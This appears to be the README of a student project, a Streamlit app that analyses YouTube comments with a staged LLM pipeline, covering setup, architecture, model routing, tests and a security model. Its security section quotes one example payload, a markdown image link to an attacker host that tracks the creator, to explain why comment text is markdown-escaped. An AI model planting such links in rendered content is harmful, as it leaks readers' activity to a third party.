# Audience Mood Analyzer

Paste a YouTube channel or video URL. Get back three things a creator can act
on the same day:

1. **What your audience is asking you to make** — clustered content requests,
   each with a suggested video title.
2. **Where your explanation didn't land** — recurring confusion points, with
   the timestamp viewers kept citing.
3. **Which video landed badly, and why** — sentiment per video against the
   channel average, with the likely driver.

Every claim is backed by verbatim comments. Not paraphrases — the exact text,
validated character-by-character against the source corpus before it can reach
the screen.

No signup, no OAuth. One Streamlit process, one Postgres connection string.

---

## Table of contents

- [Quickstart](#quickstart)
- [Configuration](#configuration)
- [Verify before you spend: the preflight harness](#verify-before-you-spend-the-preflight-harness)
- [Architecture](#architecture)
- [The four stages in detail](#the-four-stages-in-detail)
- [Model routing](#model-routing)
- [How we built it — the decisions and the evidence](#how-we-built-it--the-decisions-and-the-evidence)
- [Testing](#testing)
- [Security model](#security-model)
- [Deployment](#deployment)
- [Known limitations](#known-limitations)
- [Project layout](#project-layout)

---

## Quickstart

```sh
git clone https://github.com/Oruwe/Audience-Mood-Analyzer_HiDevs
cd Audience-Mood-Analyzer_HiDevs

python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -r requirements.txt

cp .env.example .env        # then fill in the three required keys
streamlit run app.py
```

That's the whole stack. There is no API server to start, no worker to
supervise, no message queue. The expensive work runs in a background thread
inside the same process and checkpoints its progress to Postgres, so the UI
never blocks and a restart never redoes work it already paid for.

Open http://localhost:8501, paste a URL like
`https://www.youtube.com/watch?v=<video-id>` or
`https://www.youtube.com/@SomeChannel`, and click **Analyze**.

### Getting the keys

| Key | Where | Cost |
|---|---|---|
| `YOUTUBE_API_KEY` | [Google Cloud Console](https://console.cloud.google.com/) → enable **YouTube Data API v3** → create an API key | Free, 10,000 quota units/day |
| `OPENROUTER_API_KEY` | [openrouter.ai/keys](https://openrouter.ai/keys) | Pay-as-you-go; a 500-comment analysis costs ≈ **$0.03** |
| `DATABASE_URL` | [Neon](https://neon.tech) or [Supabase](https://supabase.com) free tier, or local Postgres | Free |

A plain YouTube API key is enough — the app only reads public
`commentThreads.list` data, so there is no OAuth flow and no user consent
screen.

### Local Postgres instead of a hosted one

```sh
sudo service postgresql start
createdb audience_mood_analyzer
# DATABASE_URL=postgresql://postgres:postgres@localhost:5432/audience_mood_analyzer
```

The schema creates itself on first connect. There are no migration files to
run.

---

## Configuration

Everything is environment variables; nothing is read from a config file at
runtime.

**Required**

| Variable | Purpose |
|---|---|
| `YOUTUBE_API_KEY` | Comment ingestion (`ingestion/youtube.py`) |
| `OPENROUTER_API_KEY` | All generative inference — Stages A, B, C |
| `DATABASE_URL` | Job state, checkpoints, the analysis cache |

**Optional**

| Variable | Default | Purpose |
|---|---|---|
| `PREFLIGHT_ON_BOOT` | unset | Set to `1` to run the full preflight once per container at startup and log the report. Makes a handful of real (tiny) model calls. |
| `REDIS_URL` | unset | Switches deduplication from an in-memory LRU to Redis. Only useful across multiple processes. |
| `LANGFUSE_PUBLIC_KEY` / `LANGFUSE_SECRET_KEY` | unset | LLM tracing. |

---

## Verify before you spend: the preflight harness

This is the part of the project we would point at first.

A pipeline with four external dependencies fails in ways unit tests cannot
see. A model slug gets withdrawn. An embedding endpoint returns a different
vector width. A key runs out of credit. Each of those passes every mocked test
in the repo and then fails in production, three minutes and several paid calls
into an analysis, with an error the user reads as "the app is broken."

`harness/preflight.py` probes **13 seams through the real production code
paths** — not mocks, not a ping, the actual functions the pipeline calls —
against the actual providers, for about **$0.0002**:

```sh
python -m harness.preflight              # everything, including live probes
python -m harness.preflight --offline    # config + Postgres only, $0
python -m harness.preflight --json       # machine-readable
```

```
========================================================================
Preflight — Audience Mood Analyzer
========================================================================
✅ Environment variables          all 3 present
✅ Model configuration            8 model strings well-formed, EMBEDDING_DIM=1536
✅ Postgres round-trip            schema ok, round-trip ok, reaper ok
✅ YouTube API key                key valid, quota available (1 unit spent)
✅ OpenRouter key + credit        key valid, unlimited credit
✅ Stage A · sentiment            2/2 labelled, ids echoed exactly
✅ Stage A · sentiment fallback   2/2 labelled, ids echoed exactly
✅ Stage A · embeddings           2 vectors, width 1536 matches EMBEDDING_DIM
✅ Stage A · embeddings fallback  2 vectors, width 1536 matches EMBEDDING_DIM
✅ Stage B · classify             2/2 labelled, ids echoed exactly
✅ Stage B · classify fallback    2/2 labelled, ids echoed exactly
✅ Stage C · synthesis            valid draft, 2 verbatim quote(s) accepted
✅ Stage C · synthesis fallback   valid draft, 2 verbatim quote(s) accepted
========================================================================
13 passed · 0 warned · 0 failed · 0 skipped
READY — every seam verified against its real provider.
```

Four design rules make it trustworthy rather than decorative:

1. **Probe through the real code.** The Stage A check calls
   `engine.stage_a.classify_sentiment_batch`, the same function the pipeline
   calls. A harness that reimplements the call proves the harness works.
2. **A skipped check is not a pass.** `report.ready` is `False` if *anything*
   was skipped. A seam that couldn't be tested is unproven, and reporting it as
   green is how a harness lies to you.
3. **One broken seam never hides the others.** Every check is wrapped so an
   exception becomes a reported `FAIL`, not an abort. You get the full picture
   in one run instead of fixing failures one restart at a time.
4. **Report real spend honestly.** The cost line reads OpenRouter's usage
   counter as a before/after delta. That counter lags, so a short run often
   shows a zero delta it did not actually achieve — the report **says so**
   rather than printing a comforting `$0.000000`.

The harness has already earned its keep three times. It caught a **404 on a
withdrawn embedding slug** before a real analysis hit it. It caught a
**dimension mismatch** that nothing else in the codebase checks — `EMBEDDING_DIM`
had only ever been *documented*, never verified against a live response, and a
wrong width doesn't crash anything, it silently makes every downstream cluster
meaningless. And it caught **a strictly stronger model corrupting a quote**:
given `"this finally made sense to me, thank you!!"`, `gemini-2.5-flash`
returned `"...thank thank you!!"`. Not a paraphrase — a corrupted copy, which on
a real run would have silently emptied insight blocks with no error anyone
would see. That one finding is why Stage C is deliberately *not* the
highest-capability model available.

The same report is available in-app from the **Diagnostics** panel, which is
usually the more useful place: it tests the network path production actually
uses, rather than a developer laptop's.

---

## Architecture

```
                    ┌──────────────────────────────────────────┐
   YouTube URL ───▶ │  app.py — Streamlit, the only process    │
                    │  validates URL, estimates quota, starts  │
                    │  a job, polls progress every 3s          │
                    └────────────────┬─────────────────────────┘
                                     │ starts a daemon thread
                                     ▼
                    ┌──────────────────────────────────────────┐
                    │  orchestration.py — one checkpointed,     │
                    │  cancellable, resumable job               │
                    └────────────────┬─────────────────────────┘
                                     │
   ingestion/youtube.py              ▼
   quota accounting,      ┌──────────────────────┐
   PII masking, dedup ───▶│  Stage A  (100%)     │  sentiment + embeddings
                          └──────────┬───────────┘
                                     │ stage_filter.py — 3 criteria
                                     ▼  (~10–20% promoted)
                          ┌──────────────────────┐
                          │  Stage B  (subset)   │  intent / request / confusion
                          └──────────┬───────────┘
                                     │ KMeans clustering
                                     ▼
                          ┌──────────────────────┐
                          │  Stage C  (~8 calls) │  synthesis + verbatim quotes
                          └──────────┬───────────┘
                                     │
                                     ▼
                    ┌──────────────────────────────────────────┐
                    │  storage/postgres.py — jobs, batches,     │
                    │  checkpoints, results, the cache          │
                    └──────────────────────────────────────────┘
```

**Why one process.** An earlier version of this project ran three: an asyncio
pipeline, a FastAPI service, and a Streamlit console talking to it over HTTP.
For a single-user analysis tool that is ceremony — it triples the deployment
surface to decouple components that always deploy together. The expensive work
still doesn't block the UI, because it runs in a background thread with its own
event loop and reports progress through Postgres rather than through memory.

**Why checkpointing.** Each unit of work — one video's comments, one Stage A
sentiment batch, one embedding batch, one Stage B batch — is written to
Postgres as it finishes. On restart the job loads what's already done and skips
it. A free-tier container that sleeps mid-analysis, a redeploy, an OOM kill:
none of them re-spend YouTube quota or OpenRouter credit on work already paid
for.

**Why an atomic claim.** `claim_job` transitions a job from `pending` to
`running` exactly once, in a single statement. A double-click, or a Streamlit
rerun that re-triggers the background thread, is a safe no-op the second time
instead of two threads racing on the same job.

**Why a heartbeat and a reaper.** A background thread dies with its container
and leaves the job row saying `running` forever — the UI spins indefinitely on
a Cancel button with nothing left to cancel. The job now writes a heartbeat
every 30s, and the progress-poll path retires any job whose worker has gone
quiet for 5 minutes. There is also a hard 15-minute deadline, because
cooperative cancellation cannot interrupt an in-flight `await`.

---

## The four stages in detail

### Ingestion — `ingestion/`

The only module that talks to the YouTube Data API. It resolves a channel or
video URL, walks the uploads playlist, and paginates `commentThreads.list`.

Every list call it uses costs a flat **1 quota unit**. The expensive
`search.list` (100 units) is deliberately never used, which is why a legacy
`/c/CustomName` URL gets a clear explanation instead of silently burning a
hundredth of the daily budget.

Before the caller sees a single comment it has already been through:

- **`normalizer.py`** — strips tracking parameters (`utm_*`, `gclid`, `fbclid`
  and friends), masks emails and phone numbers, collapses messy whitespace.
  Deliberately **preserves newlines** inside comment text, which turned out to
  matter — see the payload-format story below.
- **`dedup.py`** — a normalised SHA-256 fingerprint per comment, with a TTL
  window. In-memory LRU by default, Redis if `REDIS_URL` is set.

Quota is estimated **before** the job starts, and a channel that would exceed
the remaining budget is refused up front with a number. A clear refusal reads
as competence; a spinner that dies halfway does not.

### Stage A — sentiment + embeddings over 100% of comments

Two jobs, both batched:

- **Sentiment** — a five-way label (`strongly_positive`, `positive`, `neutral`,
  `negative`, `critical_escalation`) plus a confidence, 50 comments per call.
- **Embeddings** — one vector per comment (1536-dim), 100 per call, over
  OpenRouter's OpenAI-compatible `/embeddings` endpoint.

Embeddings are called directly over `httpx` rather than through litellm,
because litellm's cost map — which is how every other model in this project was
selected — has **zero** `openrouter/*` embedding entries. Routing through it
for this provider would be unverified.

There is no hash-vector fallback. A dimension or count mismatch is a hard
error, deliberately: the previous version of this project had one, and it
silently made clustering meaningless whenever it fired.

### The filter — `engine/stage_filter.py`

Stage B only sees what Stage A flags. Three independent criteria, any one of
which promotes a comment:

1. **Strong negative** sentiment — confusion-point candidates.
2. **High confidence**, regardless of polarity. This one is easy to get wrong.
   Filtering on negative sentiment alone would starve the *requests* block
   entirely: "LOVED this, please make a Docker follow-up!" is high-confidence
   *positive* and is exactly what Block 1 exists to surface.
3. **Inside a dense cluster** — comments that closely resemble many others by
   embedding, even if each reads as unremarkable alone. "Twenty people asked
   the same thing" is the signal, and no single one of those twenty comments
   looks special on its own.

Roughly 10–20% of comments survive this, which is what makes the whole thing
affordable.

### Stage B — intent classification on the subset

`intent` (request / confusion / praise / criticism / other), plus two
independent booleans `is_request` and `is_confusion`. The prompt spells out
that they are independent, because a weak model collapses them into "whatever
the intent label was" — a comment can be confused *and* ask for a follow-up.

### Stage C — synthesis, ~8 calls

KMeans over the Stage B output, then one call per cluster:

- up to 3 calls — request clusters
- up to 3 calls — confusion clusters
- up to 2 calls — the worst-performing videos' `top_negative_driver`

Block 3's `sentiment_score` and `delta_vs_channel_avg` are **pure arithmetic**
over Stage A's already-computed labels. There is no synthesis task there an LLM
would do better than a mean, so no call is spent on it.

Every quote comes back through `model_validate_json(..., context={"corpus": ...})`,
and a quote that isn't an exact substring of a real comment fails validation
before it reaches anything downstream. A failed quote discards the **entire**
insight block rather than degrading it — a half-sourced insight is worse than
no insight, because it looks identical to a good one.

---

## Model routing

Every model string lives in `config/models.py` and **nowhere else**. A test
greps the tree and fails the build if a model string appears outside that file.
That single-boundary rule is what makes a model swap a two-line edit instead of
a refactor — which mattered, because this project swapped models eight times in
two days as evidence came in.

| Stage | Primary | Fallback | Vendors |
|---|---|---|---|
| A · sentiment | `openai/gpt-4.1-nano` | `google/gemini-2.5-flash-lite` | OpenAI → Google |
| A · embeddings | `openai/text-embedding-3-small` | `openai/text-embedding-ada-002` | OpenAI → OpenAI |
| B · classify | `openai/gpt-4.1-mini` | `deepseek/deepseek-v3.2` | OpenAI → DeepSeek |
| C · synthesis | `openai/gpt-4.1-mini` | `mistralai/mistral-medium-3.1` | OpenAI → Mistral |

Every fallback is on a **different vendor from its primary and from every other
stage's fallback**, so no single provider capacity event can take out two
stages' insurance at once.

**Except embeddings**, which deliberately break that rule — and the break is
required, not careless. Unlike a chat completion, where the JSON schema is the
same regardless of which model answers, an embedding's output *width* is a
property of the model. A different-width fallback wouldn't degrade clustering,
it would corrupt it: KMeans over vectors of inconsistent size. `ada-002` and
`text-embedding-3-small` share 1536 dimensions by construction, and that is the
actual selection constraint.

---

## How we built it — the decisions and the evidence

The interesting parts of this project are the places where the first answer was
wrong and the logs said so. Each of these is recorded at length in the relevant
module's docstring; this is the short version.

### The free tier was tried, measured, and abandoned

Every stage started on OpenRouter `:free` endpoints, on the explicit priority of
$0 spend. Within one session, a real analysis spent **6+ minutes in Stage A
alone**, hitting 429s on effectively every batch.

The error carried the diagnosis: `limit_source: upstream_provider_shared_pool`.
Free-tier capacity is shared across *all* OpenRouter users, so the rate limit
has nothing to do with your usage. Stage A was paid for first, on the reasoning
that Stage B/C's lower call volume made the same risk cheaper to carry there.

**That reasoning was wrong, and the logs said so within minutes.** With Stage A
fast, the analysis simply moved its stall into Stage B, which hit the identical
shared-pool 429. Volume was never what made a stage slow — *sharing a pool with
every other free user* was.

The fallbacks were left on free models one step longer, on the reasoning that
insurance pays out rarely so its rate limits cost nothing. Also wrong, for one
specific reason: **insurance is only insurance if it answers when called.** A
free fallback routes a failing paid primary straight back into the fire at
exactly the moment reliability matters most.

All four stages and all three fallbacks are now paid. A full 500-comment
analysis costs about **$0.03**.

### Why not the local encoder the spec called for

The original design specified Stage A as a local, deterministic encoder — free,
no quota, and structurally immune to prompt injection because an encoder has no
instruction channel. That is still the better architecture in principle.

It does not fit this deployment. Render's free plan gives the service **512 MB
RAM and 0.1 CPU**, and the running app already sits at ~440 MB. PyTorch alone is
300–500 MB resident before any weights load. Even ONNX Runtime with an
int8-quantized MiniLM (~150–200 MB) doesn't fit the ~65 MB of headroom. And 0.1
CPU would make encoder inference over a few hundred comments *slower* than the
API calls it replaced, because a paid endpoint runs on the provider's GPU
rather than a tenth of a shared core.

So "free and fast" inverts to "needs a $25/mo instance upgrade and is slower,"
against ~$0.01 per analysis paid. Revisit the day this runs somewhere with ≥2 GB
RAM and a real core — the single-config-boundary rule means switching back is a
few lines.

### The exception hierarchy that ate the retries

Retries were keyed on `litellm.exceptions.APIError`, on the reasonable
assumption that it was the parent of `RateLimitError` and
`ServiceUnavailableError`. **It is a sibling.** The real common ancestor is
`openai.APIError`. Every bare `APIError` was falling straight through the retry
decorator.

Fixing it surfaced a second problem: retry and fallback had been conflated into
one predicate. They are different questions. A `404` on a withdrawn model slug
should **never be retried** — the slug is gone, retrying is a slower failure —
but it is *exactly* when you want to fall back to another vendor. A `401`
should do neither. `resilience.py` now has two separate deny-lists:

```python
def is_retryable_api_error(exc):        # don't retry auth, bad request, 404, 429
def is_fallback_worthy_api_error(exc):  # do fall back on 404 and 429; not on auth
```

### The bug that cost the most: asking a model to echo opaque IDs

Stage A and Stage B both batch 50 comments per call, and both enforce the same
guard: the response array length **and** the comment-ID set must match the
input exactly, or the batch splits in half and retries.

Production logs filled with `batch of 50 returned a length/id mismatch;
splitting and retrying`. Every one of those is a doubled call, and the splits
cascade — so a stage that should take one call was taking fifteen.

The cause was in the payload format. Real YouTube comment IDs look like
`UgxKREWxIgQ7mZlbUZ14AaABAg` — 26 opaque characters. A batch of 50 was asking a
model to reproduce **50 such strings character-perfectly**, and one wrong
character anywhere failed the entire batch. That is a coin flip dressed up as a
contract.

The fix: the model never sees a real ID. It sees `"0"`, `"1"`, `"2"` — trivially
reliable to echo — and the mapping back to real IDs happens locally, where it
cannot be got wrong. Fewer tokens, too.

A related fix came first. The original payload was one `<id>: <text>` line per
comment, but the normalizer deliberately preserves newlines, so a multi-line
comment became several lines with no ID prefix on the continuations and the
model could not tell where one comment ended. The payload is now a JSON array,
which escapes the newlines.

### The harness had a blind spot, and it was the expensive kind

Through all of the above, preflight stayed green. It was using friendly probe
IDs like `probe-0-Zx09` and single-line text — **testing an easier task than the
one production does.** A diagnostic that passes on a broken system is worse than
no diagnostic, because it converts an outage into a mystery.

The probes now carry 26-character opaque IDs and a comment containing a line
break: the two properties of real input that broke the old format.

### Escaping HTML was never the whole defence

The security invariant says "no injection via comment text," and it was enforced
by a repo-wide grep for `unsafe_allow_html`. That grep was green the entire
time the invariant was broken.

`st.markdown` renders *markdown* whether or not HTML is allowed, and markdown
reaches the network with no tag and no script. A comment reading
`![](https://attacker.example/p?u=creator)` becomes a live image request fired
from the creator's browser the moment they open their report — a tracking pixel
that tells an attacker who read what and when. `[text](url)` is the same problem
wearing a friendlier face. And a bare newline inside `> {quote}` ends the
blockquote, letting everything after it render as top-level markdown.

`_as_literal_text` now escapes every markdown special (plus `$`, since Streamlit
renders LaTeX between dollar signs) and collapses whitespace. It is applied to
quotes — verbatim attacker-chosen strings, the sharpest case — and also to
titles and model output, which are *derived* from those comments and can carry
the syntax straight through. The tests pin the actual payloads instead of the
absence of one flag.

### A diagnostics panel should not be able to take the product down

A read for the benchmark panel ran unguarded during render. An unreachable
Postgres therefore replaced the entire page — title, URL box, everything the app
is for — with a stack trace, over a panel nobody had opened.

The progress poll had the same shape and a worse consequence: it runs every few
seconds while a job is on screen, so it is the call most exposed to a momentary
blip, and raising there would lose the user's only handle on a job that is
running perfectly well in its own thread. Both now degrade to a message and
retry.

---

## Testing

```sh
pytest                              # everything
pytest tests/test_l1_*.py           # pure logic only, no I/O
pytest -k invariant                 # just the security contract tests
python -m evals.benchmark           # live sentiment accuracy + confusion matrix
```

**279 passing, 1 skipped** with a database reachable (234 passing, 46 skipped
without one — the skips are the Postgres integration tests, which enable
themselves as soon as `DATABASE_URL` points at a live database). The single
test that stays skipped either way is invariant 5 (see below).

Tests are organised in two levels:

- **L1 (11 files)** — pure logic, no I/O. URL parsing, quota arithmetic, dedup
  fingerprinting, PII masking, the stage filter, schema validation.
- **L2 (18 files)** — contracts and wiring, with fakes at the network boundary.
  Retry/fallback behaviour, batching guards, orchestration and resumption,
  Streamlit rendering, and the security invariants.

The security model defines seven invariants. **Four are enforced by a contract
test that fails the build. The other three are listed here rather than quietly
dropped, because a scorecard that hides its gaps is worth less than one that
shows them.**

| # | Invariant | Status | Proven by |
|---|---|---|---|
| 1 | The LLM never receives a secret or another user's data | ✅ enforced | No secret-store value appears in any built prompt |
| 2 | Output is a constrained schema, not free text | ✅ enforced | Injection payloads fuzzed through the classifier; output stays in-enum |
| 3 | Every quoted comment is real | ✅ enforced | Verbatim match against the source corpus |
| 4 | No injection via comment text | ✅ enforced | `unsafe_allow_html` grep **and** markdown-escaping behaviour |
| 5 | Tenant isolation | ⏸ test written, skipped | Needs the auth layer that doesn't exist yet — the test is in the tree and un-skips the day it lands |
| 6 | Least privilege + encrypted tokens | n/a | No user token exists to encrypt: this app reads only public comment data with a plain API key, so there is no OAuth flow |
| 7 | Spend cannot run away | ❌ gap | Not implemented. Spend is bounded indirectly, by YouTube's daily quota and the 15-minute job deadline, not by an explicit cap at OpenRouter |

A note on how the tests are written: several of them exist because they caught
the same bug twice. The resume-progress test was written after a checkpoint bug
in Stages A and B, and then caught the identical bug in Stage C. When a test
starts inverting — an assertion that used to describe the bug now describes the
correct behaviour — it gets rewritten to express the original failure a
different way rather than deleted.

---

## Security model

The design principle: **an architecture where a successful injection can't do
anything is stronger than a guard model watching for injections.**

- The LLM has **no tools**. It cannot call anything, read anything, or write
  anything. It returns JSON against a Pydantic schema with `Literal`/`Enum`
  types, so the worst a successful injection achieves is mislabelling the single
  comment that carried it.
- The prompt builder takes only `(comments, config)`. No database handle, no
  session object, no secret is in scope to leak. **Treat the system prompt as
  public** — if a leaked prompt would hurt, the architecture is wrong, not the
  prompt.
- Every quote is verified against the corpus before rendering. The model cannot
  fabricate evidence, because fabricated evidence fails validation.
- All untrusted text is markdown-escaped before rendering (see above).
- Keys are read from environment variables only. Nothing is committed, and
  `.env` is gitignored.

Stage A is in scope for these invariants now that it routes through an LLM
rather than a local encoder — comment text reaches a model at 100% coverage
instead of 0%. The compensating control is the constrained output schema.

---

## Deployment

Deployed on Render's free plan as a single web service.

**Build command**
```sh
pip install -r requirements.txt
```

**Start command**
```sh
streamlit run app.py --server.port $PORT --server.address 0.0.0.0 --server.headless true
```

**Environment** — the three required keys, plus `PREFLIGHT_ON_BOOT=1` if you
want every cold start to verify its own seams and log the report.

Two things about free-tier hosting the code accounts for explicitly:

- **The container sleeps.** Streamlit executes the script when a browser session
  connects, not at container boot, and `@st.cache_resource` runs once per
  container. Checkpointing is what makes a sleep-then-wake cheap instead of a
  restart from zero.
- **512 MB / 0.1 CPU.** This is the constraint that ruled out the local encoder,
  and it is worth measuring before assuming any model can be run in-process.

---

## Known limitations

Stated plainly, because a README that only lists strengths is not useful.

- **Latency.** The target was ~40s end to end. The best real measurement is
  **89.8s for 78 comments**. Most of the remaining time is Stage A, which by
  definition runs on 100% of comments.
- **The recursive batch split is uncapped.** When a batch fails the guard it
  splits in half and both halves run concurrently, with no shared semaphore
  across the recursion. With positional aliases the splits should be rare enough
  that this never triggers — but "should be" is not "measured," and it is
  deliberately left in place pending evidence from production rather than fixed
  speculatively.
- **Model selection is reasoned, not benchmarked.** The picks come from
  litellm's maintained cost/capability map plus live preflight probes, not from
  a schema-validity bake-off across candidates. The preflight probe already
  overturned one "obviously stronger model" choice, which suggests the bake-off
  would be worth running.
- **Cluster counts and filter thresholds are documented starting points**, not
  measured optima. There is no labelled channel data to tune them against yet.
- **Single-user, no auth.** Queries are written to be `user_id`-scoped and the
  tenant-isolation test is already in the tree, but it skips: there is no auth
  layer for it to test against yet.
- **No hard spend cap.** Invariant 7 is unimplemented. Cost is bounded
  indirectly — by YouTube's 10,000-unit daily quota and the 15-minute job
  deadline — not by an explicit limit at the provider.

---

## Project layout

```
app.py                    Streamlit UI — the only entrypoint
orchestration.py          The checkpointed, cancellable, resumable job
resilience.py             Retry + fallback predicates, tenacity wiring
schemas.py                Pydantic contracts, incl. verbatim-quote validation
config/models.py          Every model string in the project. The only place.

ingestion/
  youtube.py              YouTube Data API, quota accounting, pagination
  normalizer.py           PII masking, tracking-param stripping
  dedup.py                SHA-256 fingerprints, LRU or Redis

engine/
  stage_a.py              Sentiment + embeddings over 100% of comments
  stage_filter.py         The three promotion criteria
  llm_client.py           Stage B classification
  insights.py             Stage C synthesis, clustering, quote selection
  batching.py             The split-and-retry guard, shared by A and B

storage/postgres.py       Jobs, batches, checkpoints, cache, heartbeat, reaper
harness/preflight.py      13 live seam checks — run this before you spend
evals/benchmark.py        Sentiment accuracy + confusion matrix
tests/                    29 files, L1 (logic) and L2 (contracts)
SPEC.md                   The full design document this was built against
```

---

Built as a final-year BSc Data Science project. The full design rationale —
including the decisions that were reversed and why — lives in `SPEC.md` and in
the module docstrings, which are written to be read.
